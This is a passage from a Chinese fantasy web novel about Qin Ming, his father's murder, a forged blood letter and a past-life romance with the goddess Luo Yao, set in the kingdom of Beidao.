<p>秦铭见父亲动真格了，就赶紧穿好衣裳，转身笑着说道：“爹，我好了，走吧！”秦三看着他傻头傻脑的样子，真是哭笑不得，他单手撑地，艰难地从地上爬起，拍了拍屁股上的灰尘,指了指床前的一叠衣服，说道：“祭祀大典是不能穿便衣的，呐！我昨晚已经把衣服理好放那了，快点穿，兴许还来的及”。</p>
<p>那是秦铭母亲临死前缝制的，原本还想看着他成年，可天不随人愿，她在秦铭还很小的时侯就过世了，因此秦铭对她已没什么印象。</p>
<p>秦三慢慢地走出房间，回想起秦铭儿时的情形,时光飞速。儿时的秦铭就调皮好胜，一旦跟人争强便一定要拼个你死我活。他常常带领着一帮小孩去攻打另一伙比自己年纪都大的孩子，每次弄得衣裳破损满脸污垢回家，秦三见后又是一顿毒打，但他从没为此掉过一滴眼泪，也不喊疼，只是在心里默默的暗下决心，准备再战，为自己报仇雪恨。</p>
<p>那时，秦三仿佛在自己儿子身上看见了竖立在城门口战神将军的影子，所以他辛辛苦苦地栽培秦铭，希望有朝一日他能像将军一样上场杀敌，保卫北岛的黎民，这样他的余生也能幸福了。</p>
<p>秦三静静地站立在屋檐下，看着缕缕蛛丝，青苔上瓦，不免感叹岁月如梭，时光荏苒。</p>
<p>此时，秦铭已换好了装，缓缓地走向秦三，他不想打扰他的思绪，望着他轻声说道：“爹，放心吧，我会依照娘的遗愿，做个顶天立地的男子汉，为国奋斗”。</p>
<p>秦铭知道他是想母亲了，每次想她时秦三总会看着屋檐，看着天，静静的发呆。</p>
<p>“秦铭呐，爹也希望你能成材。诶，什么都不用说了，快走吧！”秦三定了定神说道。</p>
<p>秦三父子箭步往山上奔去，幸得上天眷顾，让他们赶上了滚滚的祭祀人群。</p>
<p>“哇，好多人啊！爹，你快看。”秦铭指着人群惊呼道，首次参加祭奠，他还从没见过这么多人。</p>
<p>“这么点人就大惊小怪的，以后还怎么上战场，那时面对的可是千军万马。”秦三看着稚气未脱的秦铭，双宇间横生几分忧虑。</p>
<p>上山的路没有想象中的崎岖，只是无际的漫长，对秦三来说，已是万分艰难。年迈的秦三时不时地在路边落脚，大口大口地喘气。他看着秦铭吃力地说：“铭儿啊！看来爹是真的老了，不中用了。”看着苍老的父亲，秦铭的眼眶开始湿润，说道：“爹，你放心，待会我一定祈求战神，保佑你长命百岁”，没等他说完，秦三就用手重重地打向他的脑袋。“诶呀，爹，你干嘛呀？”秦铭叫喊着，秦三喘了口气说道：“你这个不孝子，待会去，你要虔诚地祈求战神，希望他能保佑你早日上阵杀敌，为国立业，知道吗？”。望着虚弱的秦三，秦铭强忍着眼泪说道：“可是，爹，你的身体……”。秦三抚摸着秦铭的脸，语重心长地说：“秦铭啊，爹不要什么长命百岁，爹只要你能像战神将军那样，为国立业，光中耀祖啊！只有这样，爹才能……才能对得起你死去的娘亲，才能安心的度过晚年。”秦三轻拍着胸脯大口地喘气，秦铭连忙上前搀扶起他，轻身说道：“爹，你放心吧，我不会让你失望的。”随即，两人跌跌撞撞地往山顶赶去。</p>
<p>天空渐渐转阴，不远处浓厚的黑云隔绝了蓝天，大风即将而至。</p>
<h4 id="祭祀女神"><a href="#祭祀女神" class="headerlink" title="祭祀女神"></a>祭祀女神</h4><font color="#0593d3"><em>有没有一段情可以难诉思念，纵然轮回百遍</em></font>

<p>战神祠堂建在紫铭山顶，由皇族紫衣人看守，任何凡人都无法靠近，只有在祭神节对百姓开放，供百姓敬奉。</p>
<p>紫衣族是北岛国最尊贵的种族，据说是人皇伏羲的后代，也是最为神秘的种族。</p>
<p>偌大的祭祀人群到达了紫铭山顶，山顶是一片空地，空地正中央矗立着一尊战神像，与城门口的一样，但几乎是放大了好几百倍。秦铭走到战神像旁死死地看着他，从下往上一直把头抬到脑后都望不见顶端，巨大的神像延伸到了天际，直插云霄，场面着实令他震撼。在神像背后的是壮丽的祭祀台，散发着绚丽的光芒。</p>
<p>秦三瞅了瞅呆若木鸡的秦铭说道：“小子，你还真没见过世面。据先人讲，这座神像动用了几乎全城的青壮年，历时几十年建成，并且经过圣母的通天之术，非常有灵气，能保佑我们北岛的百姓远离灾难”秦铭听得津津有味。</p>
<p>突然间，狂风大作，随风而至的大雾使得神像的身后一片雾洋。不多时，只见几十位身着紫衣的少女从神像的身后走出，身影渐渐清晰，浑身散发着淡淡的清香。</p>
<p>“女神降临，众人还不下跪”领头的紫衣女子看了看众人，随即发号施令。听到号令的百姓纷纷屈膝跪拜，双手紧贴着地面，高声齐呼：“女神千秋万载，永生不灭！”。丝毫不知状况的秦铭被秦三强拉着手臂，急急忙忙地跪地呼喊。百姓们虔诚地跪拜，身体不敢有丝毫动弹，他们无不低着头紧闭着双眼。然而，好奇的秦铭全然不知礼法，微微抬起头看着祭祀台上的一切。只见一位半边脸上蒙着轻丝面纱,身着紫金缕衣柳叶眉瓜子脸的年轻少女走上祭祀台。秦铭看着眼前的少女，有一种似曾相识的感觉。</p>
<p>“爹，她是谁啊，长的蛮漂亮的，比我们村里的那些千金小姐好太多了”秦铭捂嘴偷笑着，秦三贴住他的耳朵轻声的说，“那就是祭祀女神，哪能跟我们这些凡夫俗子比。”秦铭听后揉了揉眼睛，定睛望着女神。</p>
<p>“女神，洛瑶”秦铭口中不禁念叨着，不知怎么的，看着祭祀女神他眼角流出了泪水。</p>
<p>突然间，狂风大作，尘埃四起，祭祀台一片混沌，迷茫了一切。</p>
<p>“洛瑶，洛瑶！”不远处依稀传来呐喊，撕心裂肺。风停云定后，出现在秦铭眼前的不再是黎民百姓，而是一位妙龄的少女，她眼中流露的是无限的悲伤，少女哀求着她身边一位身披铠甲的将军，她跪着拉住将军的裤脚。</p>
<p>“将军，求求你带着这一城的百姓走吧，天地浩劫无法避免，这不是你我之力能够阻止的”少女似乎已经流干了泪水，用尽最后一丝余力哀求着将军，秦铭看着眼前的一切，忽感胸口一丝剧痛，他用手捏住自己的胸口，似乎听到了心碎的声音，顿时泪水浸没了眼眶。</p>
<p>紫铭山顶上，秦三抱着昏迷不醒的秦铭，嚎啕大哭痛苦不已，秦铭不知怎么的，看了女神一眼后就昏倒在秦三的怀里，任凭他怎么叫唤都没反应。</p>
<p>此时，几个紫衣女子从祭祀台上一飞而下，几缕丝带轻飘在空中，紫衣女子踏着丝带跃到了秦三面前。</p>
<p>“大胆刁民，竟敢在祭祀大典大呼小叫”紫衣女子说着口中念起了咒语，瞬间，几缕丝带仿佛一把把利剑，狠狠的插向秦三，悲痛中的秦三更是措手不及，眼看利剑已经逼近他。</p>
<p>突然，无数的彩蝶出现在秦三面前，为他挡住利剑的攻击。紫衣女子见眼前情景，连忙收手。正当秦三疑惑谁救了他时，面前的彩蝶像是接受了命令似地，往紫衣女子身后飞去。</p>
<p>一片迷雾之后一个模糊的身影渐渐靠近、清晰，秦三看着怀中的秦铭，心中忐忑不已。迷雾中，一位散发着紫光白发苍苍的妇老出现在秦三眼前，秦三紧紧地抱着怀中的秦铭，他容不得他受半点伤害，面对眼前救了自己的奇异妇老，他心中满是惊慌恐惧。</p>
<p>紫衣女子们纷纷前去搀扶着老妇，“见了圣母，还不下跪！”领头的紫衣女子对着秦三叫喊，“诶，紫风！不知者无罪”，圣母缓缓的走近秦三，“这位是令公子吗，我看他是中了摄魂之术，恐怕这辈子是醒不来了”，圣母说着转身向祭祀台望去，祭祀女神此时正站在那儿注视着这一切，她的身体似乎颤抖着，苍白的脸上写尽伤感。</p>
<p>“摄魂术！我这一世与人并无过结，到底是谁痛下杀手，让我们秦家无后啊！”秦三伤心地流着泪，紧紧地抱着怀中的秦铭。</p>
<p>“这一切都是命啊！这并不是你的错，而是他自己啊，自己前世种的孽，只有在今生还了”圣母说着摇了摇头，“紫风，把他带到紫金神殿，如果上苍能够原谅他们当年犯下的错，也许还有的救，诶，孽债啊！”。</p>
<p>紫风用丝带将昏厥的秦铭从秦三怀里驼浮到空中，随着圣母一起消失在迷雾深处。</p>
<p>此时，心灰意冷的秦三看着远去的秦铭，内心撕心裂肺的痛。他别无选择，只能让秦铭跟随着圣母远去，至少那样他还有机会活着，即使这辈子自己再也见不到他，他也心满意足了，也能给在天堂的妻子一个交代了，只是他不知道，没了秦铭，他活着还有什么意义，还有什么意义……</p>
<p>秦铭摇摇晃晃地站起身子，准备转身回家，正在此时，一把利剑刺入秦三的后背，直穿胸膛。秦三嘴角喷涌出鲜血，望着胸前沾满鲜血的利剑，他眼角流出了泪水，苍老的身躯再也支撑不住，随着背后的阵阵寒风倒地而亡。踏着秦三倒下的身躯，传来一阵冷笑。</p>
<p>“主人，为何要杀他？”。</p>
<p>“他已经没有利用价值了。你赶紧回去，把这份血书带给秦铭，切记小心行事。”</p>
<p>“是，主人”。</p>
<p>百年实在太久太长，也许足以让人彻底地忘记仇恨，却无法使人忘记彼此深爱着的那个人。顿时风起云涌，尘埃四起，一声长啸，渐渐地消失在迷雾深处……</p>
<h4 id="天地浩劫"><a href="#天地浩劫" class="headerlink" title="天地浩劫"></a>天地浩劫</h4><font color="#0593d3"><em>当泛着银光永无止尽的雪，融化在你的心间</em></font>

<p>北岛城的冬天似乎来得特别早，六月飞雪在这已是常事。犹如柳絮般的白雪缓缓地从天而下，不多时北岛城便是一片银白色。</p>
<p>秦铭站在一片白色之上，望着漫无边际的雪地，他无助的奔跑着。冰冷的雪花飘落在他身上，瞬间染白了外衣。突然他失落地跪倒在地，似乎丢失了什么，他把手轻轻地放在胸口，然后对天长啸，“为什么，呵…呵…”，他丢的是心。</p>
<p>寒风在秦铭耳旁呼啸，更像是命运对他的作弄，远处依稀传来几许惆怅，敲打着秦铭的记忆。秦铭起身向远处望去，两个黑影出现在白色迷茫中，身影折射出彼此相爱的痕迹。</p>
<p>“洛瑶，是你吗？洛瑶！”秦铭用尽全身力气叫喊着，但无论他怎么呼唤，答复他的只有无情的寒风呼啸。身影越来越远，秦铭痛苦的追随着，他深怕她会消失不见，他一个人已经太久太久了。雪下得越来越大，似乎淹没了一切，秦铭仍然跌跌撞撞地跑着，他还记得说过要牵着她的手，带她一起走，即使走到天涯海角。这一切他还清楚的记得，可她已经忘了，洛瑶！</p>
<p>秦铭静静地躺在玄月石上，口中不停地呼喊着，汗水湿透了他的衣服。紫金神殿内，四神兽正在为秦铭疗伤，可任凭他们怎么尽力，昏迷的秦铭仍然紧闭着双眼，只是已经流干了泪。</p>
<p> “洛瑶，洛瑶！不要走，不要……”昏迷的秦铭冒着冷汗，身体不停地颤抖着。</p>
<p>“圣母，他恐怕不行了！”紫风对着圣母说道。</p>
<p>“怎么会这样，诶！看来一切都是天意啊，我也无能为力了”圣母无力地摇着头。</p>
<p>四神兽之首青龙无奈地说道：“诶！他并非凡人，看来解铃还需系铃人啊！”。紫风走向前去，疑惑地问道：“系铃人，会是谁呢？”。</p>
<p>青龙看着犹如死人般的秦铭答道：“昏迷是一个人情感最脆弱的时候，当然也是情感最为流露的时候，他在昏迷时一直叫着洛瑶，以我看洛瑶女神应当是他的系铃人”说完四神兽便化为四道金光，消失在紫金神殿。</p>
<p>紫风走到圣母面前说道：“圣母，既然女神是他的系铃人，那……”。圣母猝然打断紫风的话，“不行，秦铭中的摄魂术就是她下的，怎么能让她再来加害他呢！”。</p>
<p>紫风不敢相信地问道：“怎么会这样？既然女神是他的系铃人，又为什么要加害他呢？不，不会的”。</p>
<p>圣母微微的抬头，转向殿外的灰色天空，往事一一浮现……</p>
<p>这要从百年前的天地浩劫说起。那场北岛国的浩劫，我至今还清楚地记得，满城的鲜血，黎民痛苦的哀鸣，如今想起还心有余悸。然而这场浩劫并非天灾，而是我们北岛国古老的族规所致。</p>
<p>千年前，北岛还处于蛮荒，我们紫衣族人来到这里，带来了文明，带来了繁华。从此北岛国逐渐繁盛，一些临近国家的百姓纷纷迁到北岛，几十年间北岛的人口增长了几十倍。然而这也带来了麻烦，如此众多的百姓，我们开始无力管治。为此紫衣先人开创了一系列的管理制度，选出出众的紫衣族人担任圣母，再由圣母推选女神，并从百姓中选出武艺最高者，封为战神。三者是北岛的灵魂，为了北岛的长盛，紫衣族人制定了族规，女神与战神不能恋爱，若是违反了族规，北岛将会遭致天地浩劫。</p>
<p>千年间，我们都安循着族规，直到百年前，新任北岛国的战神，他不顾族规与现任女神洛瑶坠入爱河。天地浩劫如约而至，北岛的繁华瞬间转为残骸，生灵涂炭。</p>
<p>眼看北岛就要灭亡，上苍怜悯北岛的百姓，决定给北岛一次赎罪的机会。战神将军必须要用鲜血洗去他的罪过，而女神则要饮下情恨水，使她对所爱之人有的只是仇恨。</p>
<p>为了北岛的百姓，战神将军战死沙场，洛瑶得知后含泪饮下了情恨水，从此她对战神只有恨。然而，我万万没有想到，百年时间不但没有使她的恨消散，反而无限地增加了她内心的仇恨，现如今竟对他痛下杀手”。</p>
<p>紫风定了定惊说：“圣母的意思是秦铭就是当年的战神将军？”圣母缓缓地点头，“从他在昏迷中一直呼喊着洛瑶这一点看，他应当与洛瑶有着千丝万缕的关系，洛瑶的痛下杀手，更让我坚信他就是战神”。</p>
<p>紫风缓缓地点了点头，“世上也只有女神懂得摄魂术，如若不是女神亲自相救，他必死无疑啊!”。</p>
<p>圣母皱了皱眉，苍老的脸上竟显忧虑，她望着昏迷中的秦铭，焦虑地说道：“不，他可能比我们想象的要复杂得多。如果说他是当年的战神，他现在应该已经没命了，因为战神毕竟只是凡人，不是我们紫衣族人，受不了摄魂术。然而，秦铭虽说身受重伤，昏迷不醒，但却依然活着，从这点看他不该是战神。”圣母叹了口气，慢慢地走近秦铭，叹息道：“看来，上天仍然无法原谅你们当年犯下的过错啊！”</p>
<p>话音刚落，只听神殿外传来女神的叫喊。</p>
<p>“让我进去，我要见圣母。”女神洛瑶着急面见圣母，与殿外守卫纠缠着。“这,这不行啊!女神，圣母吩咐过不能让任何人进入”，守卫无奈地说道。</p>
<p>“让她进来吧！”紫风搀扶着圣母走向殿外，女神站在圣母面前，冷冷地望向殿内“让我见他一眼！”。</p>
<p>圣母神情骤时凝聚，双眼放射出刺骨的寒意，“你不会是来看他有没有死吧？”圣母手中的拐杖用力向地一击“哼！中了摄魂术的凡人还能活吗？”。</p>
<p>女神不为所动，“不，他还没死，他也不能死”女神依旧死死地盯着大殿内昏迷的秦铭。弹指一挥间，万物无化，改变的只有女神的眼神，不再那么冷，甚至闪烁着泪光。她柔情的注视着秦铭，“圣母，让我见见他，这世上只有我能救他”。</p>
<p>圣母轻轻地叹了口气“好吧，天意如此，造化弄人！”说着三人缓缓走向殿内。</p>
<p>洛瑶眼中闪烁着泪光，将昏迷中的秦铭扶起。我不会让你死的，不会！洛瑶挥动着双手，身体散发出光芒，她与秦铭对掌运功。一股股气从洛瑶的身体流经秦铭，随之而去的是支离破碎的记忆。</p>
<p>此时， 秦铭的脑海中浮现出熟悉而陌生的片段，仿佛前世的记忆……</p>
<p>元宵佳节，北岛城的夜空无比绚烂，大街上到处是高挂的红灯笼，原本漆黑的夜空被五彩的烟花浓抹着，拥挤的街市，华灯初上。明月的光辉倒映在城内的渭河中，水面一席涟漪，月光渐渐远离，河面缓缓的驶过一叶扁舟。一位风华绝代的少男站在船头，一手摇晃着纸扇，一手提着灯火，神态泰然。沿途无数的少女为之轻狂，他却只是一笑而过。</p>
<p>渭河上横跨着一座古桥，夜晚的古桥异常的美，水面反射的月光更使之增添了几分色彩。元宵节，北岛的百姓都习惯放水灯笼，将灯笼放入渭河中，让其寄托着自己的希望飘荡。</p>
<p>桥上，洛瑶看着河水中的星点亮光，在绚烂的夜空下翩翩起舞。“紫风，他们过元宵节可真有意思，太好玩了！”她显得很兴奋，“小姐，我们该回去了，不然圣…夫人可要生气了”洛瑶身旁的侍从忧虑的劝说。她自当没听见，解开面纱，在空中挥舞着。</p>
<p>一阵清风，洛瑶的面纱滑出手心，随风摇曳。面纱随风飘落，眼看就要落入河中，不想迎面驶来了一叶扁舟，少男稳稳的接住了面纱。紫风连忙跑向前去，“公子，请归还面纱”，少男定睛看着洛瑶，并未听见紫风所说。船缓缓靠岸，少男走向洛瑶，先是作揖，然后将面纱放在她手中。“谢谢公子！”洛瑶缓缓地抬起头，只见一位眉清目秀的少男注视着自己，连忙低下头，“紫风，我··我们回去吧”她涨红了脸颊。“是，小姐”洛瑶渐渐消失在茫茫人群中，少男仍然站在原地，闻了闻手中残留的香味，露出了微笑，少男手中的灯火随着微风窜动着，散发着青光。</p>
<p>玄月石上，秦铭依旧昏迷不醒，额头不停地冒汗，洛瑶继续运气，圣母则坐在一旁焦虑不安。</p>
<p>残碎的记忆勾勒出逝去的光景……</p>
<p>蓝天中随风舞动的风筝悠闲的翱翔，青草地上人们追逐着。秦铭拉着长线一直蔓延到天边，洛瑶犹如彩蝶般地追随。“秦铭，等等我，等等我！”洛瑶追赶着他，秦铭转过头“你来追我啊，我可要一直跑着，让你追我到天涯海角。”洛瑶停了下来，喘了口气，“好啊，你等着！”，说罢便起身追赶。</p>
<p>玄月石上，秦铭渐渐恢复了意识。他慢慢地睁开双眼，视线渐渐清晰。圣母走近秦铭说道：“你终于醒了，你一直昏迷，已有半个月了”。秦铭用手按了按头，“诶，真痛！我这是在哪啊？我记得在山顶突然感觉眼前一片迷茫，然后就没了意识。对了，我爹呢？”秦铭满是疑惑。</p>
<p>圣母望着满脸狐疑的秦铭，从胸中拿出一封血书，递给秦铭说道：“这是你爹遗留给你的。”秦铭双眼充满血丝，死死地盯着血书，颤抖着身子说道：“你的意思是说我爹他……他死了。”圣母满是愧疚，紧皱着眉说道：“是的，他自杀了”秦铭眼角闪现着泪花，他双手捂住自己的耳朵，疯狂地摇晃着头，神情恍惚地说道：“不，不会的，他不会丢下我的。”秦铭跌跌撞撞地爬下玄月石，大伤处愈地他，脚下一软，狠狠地摔倒在地，他抬起头哭喊道：“这一切到底是怎么回事啊？”。圣母搀扶起虚弱的秦铭，无奈地摇晃着头说道：“你还是先看看血书吧，看完你会明白一切的。”</p>
<p>紫金神殿的天空布满了灰色，湿润的尘埃在黑暗的云层中酝酿，大雨即将来临。</p>
<h4 id="血书"><a href="#血书" class="headerlink" title="血书"></a>血书</h4><font color="#0593d3"><em>当用九盏红烛照亮天明的黑夜，烟花幻化作缠绵</em></font>

<p>紫金神殿内，秦铭颤抖着打开老旧的血书，里面包裹着一枚精致的玉佩，底下是一封遗书。</p>
<p>秦铭，当你看到这一切时，想必爹已不在人世了。不要难过，孩子！这一切都是命中注定的。老实说，我还要感谢你给予我的这20年时光，能成为你爹我很开心。原谅爹的自私好吗？爹的任务完成了，该休息了，往后的日子你一定要坚强。</p>
<p>20年前的冬季，雪下得特别大，我跟你娘正在屋里生火做饭，突然从屋外传来一阵孩子的哭啼。我们赶紧跑去开门，只见屋外厚厚的雪地上依稀放着一个襁褓，里面正是刚满月的婴儿，我们抱起他，心想他是上天赐予我们秦家的。紧接着，我们在襁褓中发现了一封血书，里面记载了你的身世。</p>
<p>也就是在那一年，你娘染上了怪病，我们寻访了无数的名医，都毫无作用。眼看你娘的病越来越重，突然有一天来了位自称紫衣仙人的神医，他自称能救你娘，但…但…但必须在月圆之夜，用九盏红烛的微光，结合元婴之气，做成药引服下，方能救活你娘。可这元婴，我们上哪去找啊？</p>
<p>于是，我们想起了那封血书，原来你前世正是掌管天庭九灯的灯神，因私自下凡而被贬为凡人。你修行万年，一朝成仙，然而却一念成灰。茫茫雪季，你降临了凡间，幻化成元婴，也许你是上天派来解救你娘的。</p>
<p>可事情远远不像我们所想的那样，我们万万没想到元婴会吞噬凡人的精魂，本以为可以借吸收元婴之气来救你娘，却因元婴反噬之力，使我们都深受其害。你娘不久便逝世了，紫衣仙人不辞而别，只留下了一句话：元婴现世，几世情缘；百年浩劫，父为子亡。</p>
<p>由于你的反噬之力，我的身体一天不如一天。然而，我答应了你娘，一定要把你抚养成人，因此我忍受着剧痛，就是要等到你成人之日。但我日夜都在担心，怕我撑不到那一天。秦铭，记住！一定要好好活着，我跟你娘会在天堂保护着你。</p>
<p>秦铭合上血书，他冷冷地笑着，神情恍惚，想哭就没了泪。他摇晃着走出大殿，圣母追向前去：“你要去哪？你刚刚伤愈，急需静养啊”，秦铭仍然摇晃地走着，全然不顾圣母的话。也许，此时任何的静养都无法愈合他心中的伤。</p>
<p>黑云压顶，大雨将至，似乎连上天都为此流泪。</p>
<p>淅淅沥沥的雨打在了秦铭身上，也打在了躲在一旁洛瑶的心上。秦铭拖着疲惫的身躯向殿外走去，雨浸透了他全身，洛瑶多少次都想上前留住他，可她害怕，害怕他会恨她一辈子。</p>
<p>紫金神殿内，圣母望着远去的秦铭，转头对着紫风说道：“没想到，他竟然是元婴之体，怪不得他受得了这摄魂之术。可怜他父亲，最终却不得不为他而亡啊。”紫风疑惑道：“那紫衣仙人所说的，百年浩劫，父为子亡，又是什么意思呢？”“依我看，他父亲应该也是元婴之体，传说当两个元婴面世，就会互相吸取对方的精元，直至一方死去。看来，他父亲是为了成全他而牺牲了自己啊”。</p>
<p>天渐渐地变暗，雨已停了，雨后的夜晚显得特别寒冷。秦铭裹着身体，摩擦着双手，口中直出冷气。秦铭僵硬的身体已经动弹不得，眼看不远处有道亮光，由远而至。秦铭连忙走上前去，不料却被脚下的石子拌着，连翻几个跟头，昏倒在那道光下。</p>
<p>睡梦中，秦铭听到了鸡啼声，缓缓睁开双眼，阳光异常刺眼。</p>
<p>一位老妇人端着一碗姜汤，走到秦铭面前，“小伙子，你醒啦！呐，这姜汤喝了吧！”</p>
<p>秦铭喝下姜汤，努力的回想昨日情景，“大娘，小生记得昨晚看到一道亮光，随后就昏倒了，今儿怎么在这了？”</p>
<p>老妇人笑了笑，接过汤碗，“昨晚，我老伴听到屋外有脚步声，就打着灯出去看，这不就看到你倒在地上。昨晚下过雨，想必你一定是冻着了吧！”</p>
<p>秦铭起身向老妇作揖，“大娘，多谢你的救命之恩，我秦铭真是无以为报啊。”秦铭心头些许感触。自从秦三离开他后，再没有人对他这么好了。</p>
<p>屋外传来缓慢的脚步声，老妇人起身望去，“是老头子回来了，他今早去打猎了，说是给你补补身子，不知道带回来什么？”</p>
<p>门外传来一阵脚步声，随后一位满脸胡塞的老人走进小屋，手中拿着几只野兔。秦铭未见其人就听闻其声了，“老伴，快来，今天逮了几只小东西，快拿去煮了，给小兄弟补补身。”老人放下猎物，看见秦铭已经苏醒，连忙走到他身边，“小兄弟，没事了吧，我姓徐，你就叫我老徐吧。我今天给你抓了好东西，待会吃了保证你痊愈。”老徐又对老伴说，“你去帮小兄弟找一套衣裳。”</p>
<p>秦铭看着这对老人，感动不已，他想起了秦三。“老徐，谢谢！”秦铭看着他们许久，他不知道该说些什么了。</p>
<p>老徐看了看他说道：“小兄弟，看你这身衣裳，你是参加完祭祀吧！”秦铭点了点头。“听说，祭祀那天出了大事，圣母都到了。当时一片混乱啊，你是怎么到了这里啊？这里离紫铭山顶可有些距离啊！”老徐疑惑地看着秦铭。</p>
<p>秦铭目光躲闪着，他不想让任何人知道，在紫铭山顶的事与他有关。“我和父母到这寻亲的，不想雾太大走散了。想必现在他们一定回了紫铭山顶，所以我要赶紧回去。”秦铭想回山顶看看秦三的尸体，把他带回家，即使只是尸骨。</p>
<p>老徐拍了拍秦铭的肩膀，“小兄弟，别担心，待会吃了东西我送你一程。”秦铭高兴得看着老徐，“二位的救命之恩我无以为报，待到我办完大事，定当来此相报。”说罢，秦铭向着老徐磕头。老徐连忙扶起秦铭，此时老妇端来了酒菜，三人把酒相欢，好不快乐。</p>
<p>午后，天气明朗，有着徐徐暖意。秦铭换好衣裳，在老徐的陪同下，告别了老妇，告别了小屋，继续踏上赶往紫铭山顶的道路。</p>
<h4 id="战神再生"><a href="#战神再生" class="headerlink" title="战神再生"></a>战神再生</h4><font color="#0593d3"><em>是谁漫步在紫金神殿，刻下你月牙般的笑脸</em></font>

<p>天色渐渐转暗，秦铭独自一人行走在幽静的小路。此时他的心里只有一个念头，找到秦三的遗体，带回老家安葬，然后继续经营福记当铺，安安分分的过日子。</p>
<p>北岛的夜晚总是来得很快，不一会儿就伸手不见五指了。秦铭走到小路旁的一处空地，铺开老徐家带来的棉被，倒头就睡。看来他是真的累了，也许这一切来的太突然了。</p>
<p>夜暗的发寒，漆黑的世界，唯独高空中的明月散开了光晕。秦铭缓缓地站立起来，夜的黑已经无法让他感到恐惧，因为他已失去了至亲，心已经死了。秦铭看看四周，漆黑一片。周围寂静无声，只有风在他耳旁袭过。突然，他感到一阵窒息，像是有人掐住了他的脖子。秦铭挣扎着涨红了脸，绝望间他觉得自己就要死了，他仿佛看到了秦三。突然，秦铭开始用双手抵抗，他想到自己在没找到秦三的遗体之前还不能死。秦铭抓住那双黑暗中的黑手，也不知从哪来的力气，秦铭推开了他。</p>
<p>秦铭蹲下喘气，四周渐渐清晰。不远处一个模糊的影子向他靠近，秦铭眼睛不眨地盯着，他想知道是谁想下杀手。</p>
<p>眼前一个少年的轮廓渐渐清晰，在月光下十分阴冷。秦铭慢慢走近，眼睛一刻不离地望着他，因为他长的与秦铭无异，只是装束显得邪气。秦铭简直不敢相信自己的眼睛，定了定惊问道：“你…你…你到底是谁？为何要加害与我？”</p>
<p>少年的嘴角露出冷冷地笑，无声无息。他走近秦铭，一字一句地说：“我…就…是…你啊”话音刚落，他随着一阵风消失在秦铭的眼前。秦铭全身颤抖着，蹲下身子，双手捂住嘴。此时，秦铭的眼里只剩下恐惧，有太多的疑问在他心中，而且又是那么可怕。秦铭陷入无尽的恐惧，身体直冒冷汗。</p>
<p>温暖的阳光普照在秦铭身上，让他感觉一丝暖意。四周万物鸣叫，百花齐放，一切寓意着春天到了。秦铭在一阵吵闹声中醒来，看着四周他笑了，他是在庆幸昨晚只是一个噩梦而已。</p>
<p>而在此时，神魂殿内，殿主青灯盘膝而坐，双目紧闭。殿门开出一道亮光，迎面走来一个紫衣少女。“主人，血书已经成功交到秦铭手上。”紫衣少女跪下说道。“恩…不错，那个老不死的没起疑心吧?”青灯缓缓睁开双眼。“一切都如主人所料，洛瑶回到紫金神殿为秦铭疗伤，而圣母看了血书也没有起丝毫疑心，她现在已经认为秦铭就是元婴之体。”紫衣少女抬头说道。“哈哈…洛瑶啊洛瑶，我早知道你已经不再恨秦铭，也不会伤及他性命，既然如此我只有借你的手，让老东西误认为秦铭就是元婴，到时候我就能顺利成章的替代他，成为战神的再生。到那时，北岛城就落在我的手中了，啊哈哈……”青灯站起身子，放声大笑，响彻山谷。</p>
<p>“你赶快回到老东西身边，有任何情况，马上向我汇报”。</p>
<p>“是，主人”紫衣少女退出殿内，化身为一道光束，渐渐消失不见。</p>
<p>紫金神殿外，紫风推开殿们，走向殿内，对着圣母说道：“圣母，自从秦铭走后，女神就一直跟随着他，我们要不要……”。圣母摆了摆手，说道：“既然秦铭不是战神，就随他去吧。可是，我不明白竟然他不是战神，又为何与洛瑶有着千丝万缕的情缘？”。紫风转了转眼珠，身子凑近圣母说：“圣母，秦铭的外貌与当年的战神比如何？”圣母挪步说道：“分毫不差，以至于起初我也以为他就是战神啊”，紫风继续说：“就连圣母都误认为秦铭就是当年的战神将军，女神也不会例外吧。”圣母点了点头，“没错，真正的战神再生者又在哪呢？”。紫风贴近圣母，嘴对着圣母的耳朵说：“圣母，我们紫衣神族每年都举行祭祀仪式，不就是为了找出战神的转世吗？如今，众人已经目睹了秦铭被女神所伤，我们何不以找到战神再生为由，召集百姓到紫铭山顶，到时便可从中找出真正的战神。”圣母定了定神说：“对，我们一定要赶在洛瑶之前到达紫铭山顶，找出真正的战神。传我的口谕，召集北岛所有百姓，明日午时集会于紫铭山顶”。圣母转身走向殿外，遥望着远处的群山之巅。</p>
<h4 id="黑风阵"><a href="#黑风阵" class="headerlink" title="黑风阵"></a>黑风阵</h4><font color="#0593d3"><em>是谁相拥在清风之间，飞舞在蓝天下的依恋</em></font>

<p>离开紫金神殿已经数天，秦铭拖着疲惫的身躯来到了青灯岭。青灯岭是通往紫金山顶的必经之路，但也因为夜间常有青灯半浮山间，野兽哀嚎溪谷，被外界称为鬼岭。</p>
<p>刚过午后，青灯岭的天色已经渐渐暗沉下来，秦铭就近找了一片树林，倚靠在树下，静静地坐着。苍郁的绿树下蜷缩着一个瘦弱的孤影，秦铭眼中含着泪，脸上留下了斑驳的几处伤。秦铭拿出仅剩的干粮，啃咬间他开始哽咽，原本瘦弱的脸被涨地通红。</p>
<p>夜空中，漫天繁星闪烁着，秦铭抬头仰望着星空，寻找属于秦三的那一颗，在他萧瑟的眼眸中，尽是秦三微笑的脸庞。</p>
<p>霎时间，风起云涌，一团团黑云从夜空压向树林。只见半空中，一阵阵黑风旋转着呼啸在卷缩成一团的秦铭周围，到像是在打量他。秦铭顶着烈风，艰难地抬起头，看着不远处的团团黑风向自己逼近。秦铭尝试着站起身子，但剧烈的风，使他一次次狠狠地摔倒在地。眼看黑风离自己仅是一步之遥，秦铭赶忙紧闭双眼，双手使劲向外，试图抵挡黑风的侵袭。</p>
<p>不一会儿，周围没有了强烈的呼啸，显得异常的安静。秦铭放下伤痕累累的手，缓缓地睁开了双眼，没想到眼前却是一片黑暗，伸手不见五指。秦铭踉踉跄跄地站起身子，寻找着那片树林，还有头顶的星空。尽管没有了烈风，但此时的秦铭已经支撑不了他那伤痕累累的身躯，没走几步，他又摔倒在地，身上的血书被甩出，落在了秦铭的眼前。秦铭绝望地看着秦三留下的遗物，心中万念俱灰，他不明白原本平淡快乐的生活，为何转眼便是生死两茫茫。心如死灰的秦铭，手紧捏着血书，疲惫的双眼再也支撑不住。突然间，一道亮光闪过秦铭的眼眸，他迷迷糊糊地看着远处的一道黑影向自己走来，没等他看清，便又是无尽的黑暗。</p>
